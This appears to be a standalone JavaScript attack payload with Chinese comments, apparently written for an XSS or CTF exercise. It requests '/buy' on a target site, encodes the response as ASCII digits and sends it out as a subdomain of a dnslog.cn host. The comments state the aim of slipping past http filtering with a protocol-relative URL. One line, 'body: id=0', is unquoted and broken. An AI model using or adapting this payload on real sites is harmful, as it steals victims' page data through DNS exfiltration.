fetch("gh2bq2.dnslog.cn");

const fetchOptions = {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: id=0
};
fetch('/buy', fetchOptions)
  .then(response => response.text())
  .then(text => {
    fetch("//" 	//利用协议相对url绕过对http的拦截
      + text.split('').map(char => char.charCodeAt(0)).join('').substring(100)	//处理为ASCII使之能成为子域
      + ".gh2bq2.dnslog.cn")		//dnslog域名
  })
